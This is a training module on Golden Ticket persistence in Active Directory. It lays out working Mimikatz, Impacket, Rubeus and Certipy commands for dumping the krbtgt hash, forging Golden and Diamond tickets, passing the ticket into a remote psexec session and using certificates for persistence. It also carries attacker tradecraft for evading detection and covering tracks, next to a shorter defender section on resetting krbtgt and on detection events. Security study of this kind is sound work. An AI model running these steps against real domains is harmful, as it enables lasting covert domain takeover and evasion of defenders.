# Golden Ticket Persistence

## Unit 7 - Topic 2 | Persistence

---

## Overview

**Golden Ticket persistence** uses the krbtgt account hash to forge Kerberos TGTs at any time, providing indefinite domain access. Since the krbtgt hash rarely changes (and must be changed twice to invalidate), a Golden Ticket represents one of the most durable persistence mechanisms in Active Directory.

---

## 1. Golden Ticket as Persistence

```
WHY GOLDEN TICKETS = ULTIMATE PERSISTENCE:

1. SURVIVE EVERYTHING:
   ├── Survive password changes (all users except krbtgt)
   ├── Survive account disabling
   ├── Survive account deletion (non-existent users work!)
   ├── Survive group membership changes
   └── Only invalidated by: krbtgt password change (x2)

2. OFFLINE CAPABILITY:
   ├── Generate tickets offline (no DC contact needed)
   ├── Store krbtgt hash securely
   ├── Create new tickets anytime
   └── Each ticket valid for specified lifetime

3. FLEXIBILITY:
   ├── Impersonate ANY user
   ├── Include ANY group memberships
   ├── Set custom ticket lifetime (10+ years)
   └── Works for all services in the domain

LIFECYCLE:
┌────────────────┐
│ 1. Compromise  │ → Get DA/DCSync access
│    Domain      │
├────────────────┤
│ 2. Extract     │ → DCSync: lsadump::dcsync /user:krbtgt
│    krbtgt hash │ → Store hash securely offline
├────────────────┤
│ 3. Clean up    │ → Remove other persistence
│    access      │ → Cover tracks
├────────────────┤
│ 4. Re-access   │ → Forge Golden Ticket anytime
│    anytime     │ → Use for Kerberos auth
└────────────────┘
```

---

## 2. Creating Golden Tickets for Persistence

```bash
# === STEP 1: SAVE REQUIRED INFO ===
# Get krbtgt hash:
# Mimikatz:
lsadump::dcsync /user:corp\krbtgt
# Save: NTLM hash AND AES-256 key

# Impacket:
secretsdump.py corp.local/admin:pass@dc01 -just-dc-user krbtgt
# Output: krbtgt:502:LM_HASH:NTLM_HASH:::

# Get Domain SID:
Get-DomainSID
# S-1-5-21-1234567890-1234567890-1234567890

# === STEP 2: STORE INFO SECURELY ===
# Save offline:
# - krbtgt NTLM hash
# - krbtgt AES-256 key
# - Domain SID
# - Domain name

# === STEP 3: FORGE TICKET WHEN NEEDED ===
# Mimikatz:
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-DOMAIN-SID \
  /krbtgt:KRBTGT_NTLM_HASH \
  /id:500 /groups:512,513,518,519,520 \
  /ticket:golden.kirbi
# /id:500 = Administrator RID
# /groups: 512=DA, 513=DU, 518=SchemaAdmins,
#          519=EnterpriseAdmins, 520=GPCreator

# With AES key (stealthier):
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-DOMAIN-SID \
  /aes256:KRBTGT_AES256_KEY \
  /ticket:golden.kirbi

# Impacket:
ticketer.py -nthash KRBTGT_HASH \
  -domain-sid S-1-5-21-DOMAIN-SID \
  -domain corp.local Administrator

# === STEP 4: USE THE TICKET ===
# Mimikatz:
kerberos::ptt golden.kirbi

# Impacket:
export KRB5CCNAME=Administrator.ccache
psexec.py corp.local/Administrator@dc01 -k -no-pass
```

---

## 3. Golden Ticket Best Practices (Attacker)

```
OPSEC CONSIDERATIONS:

1. USE AES-256 INSTEAD OF RC4:
   ├── RC4 TGT requests are suspicious (etype 23)
   ├── AES-256 matches normal Kerberos behavior
   └── Harder for defenders to detect

2. USE REALISTIC PARAMETERS:
   ├── Don't set 10-year ticket lifetime
   ├── Use default: 10 hours, renewable 7 days
   ├── Use real user account names
   └── Include correct group memberships

3. DON'T FORGE NON-EXISTENT USERS:
   ├── PAC validation may flag unknown users
   ├── Use Administrator or known DA account
   └── More realistic = less detection

4. LIMIT USAGE:
   ├── Only forge when needed
   ├── Don't maintain persistent connection
   ├── Access, accomplish task, disconnect
   └── Each use creates Kerberos log entries

5. STORE SAFELY:
   ├── Encrypt stored krbtgt hash
   ├── Don't store on compromised systems
   ├── Keep minimal copies
   └── Use secure password manager
```

---

## 4. Invalidating Golden Tickets

```powershell
# === DEFENDER: KRBTGT PASSWORD RESET ===
# Must reset TWICE! Here's why:

# AD stores: current password + previous password
# After 1st reset:
#   Current = NEW password
#   Previous = OLD password (Golden Ticket still valid!)
# After 2nd reset:
#   Current = NEWER password
#   Previous = NEW password (OLD password gone = ticket invalid!)

# === RESET PROCEDURE ===
# Step 1: First krbtgt password reset
# Use Microsoft's krbtgt reset script:
# https://github.com/microsoft/New-KrbtgtKeys.ps1

# Manual reset:
Reset-ADAccountPassword -Identity krbtgt

# Step 2: Wait for replication (ALL DCs)
# Minimum: 10-24 hours (depends on replication schedule)
# Verify replication:
repadmin /replsummary

# Step 3: Second krbtgt password reset
Reset-ADAccountPassword -Identity krbtgt

# Step 4: Wait for replication again

# CAUTION:
# - Resetting krbtgt invalidates ALL existing TGTs
# - Users may need to re-authenticate
# - Kerberos services may temporarily fail
# - Plan during maintenance window
# - Test in lab first!

# === DETECTION OF GOLDEN TICKETS ===
# Event ID 4769: TGS request
# Look for:
# - Ticket encryption type: RC4 (0x17) when AES expected
# - Abnormally long ticket lifetime
# - TGT for non-existent user (if attacker made mistake)
# - TGS requests without prior TGT request (4768)
```

---

## 5. Diamond and Sapphire Ticket Persistence

```bash
# === DIAMOND TICKET (Harder to Detect) ===
# Instead of forging entire TGT:
# 1. Request legitimate TGT
# 2. Decrypt it (need krbtgt key)
# 3. Modify PAC (add admin groups)
# 4. Re-encrypt

# Advantages over Golden Ticket:
# - Has legitimate ticket metadata
# - Request timestamp is real
# - Harder to detect via ticket anomalies

.\Rubeus.exe diamond /krbkey:AES256_KEY \
  /user:normaluser /password:pass \
  /enctype:aes /domain:corp.local /dc:dc01 /ptt

# === CERTIFICATE-BASED PERSISTENCE ===
# Even more durable than Golden Ticket!
# Request certificate for DA → valid for 1-2 years
# Certificate survives ALL password changes (including krbtgt!)

certipy req -u admin@corp.local -p pass \
  -ca corp-CA -template User -dc-ip dc01
# Valid for ~1 year, works even after krbtgt reset!

certipy auth -pfx admin.pfx -dc-ip dc01
# Gets NTLM hash of admin → full access
```

---

## Summary Table

| Aspect | Golden Ticket | Diamond Ticket | Certificate |
|--------|:------------:|:--------------:|:-----------:|
| **Requires** | krbtgt hash | krbtgt hash | CA access |
| **Detection** | Moderate | Hard | Very Hard |
| **Survives krbtgt reset** | No (after 2x) | No (after 2x) | Yes! |
| **Lifetime** | Configurable | Configurable | 1-2 years |
| **Invalidation** | krbtgt reset 2x | krbtgt reset 2x | Revoke cert |

---

## Quick Revision Questions

1. **Why must krbtgt be reset twice to invalidate Golden Tickets?**
2. **Why is AES-256 preferred over RC4 for Golden Tickets?**
3. **How long does a Golden Ticket persist by default?**
4. **What advantages do Diamond Tickets have over Golden Tickets?**
5. **Why might certificate-based persistence be superior?**

---

[← Previous: User Account Persistence](01-user-account-persistence.md) | [Next: Skeleton Key →](03-skeleton-key.md)

---

*Unit 7 - Topic 2 of 6 | [Back to README](../README.md)*
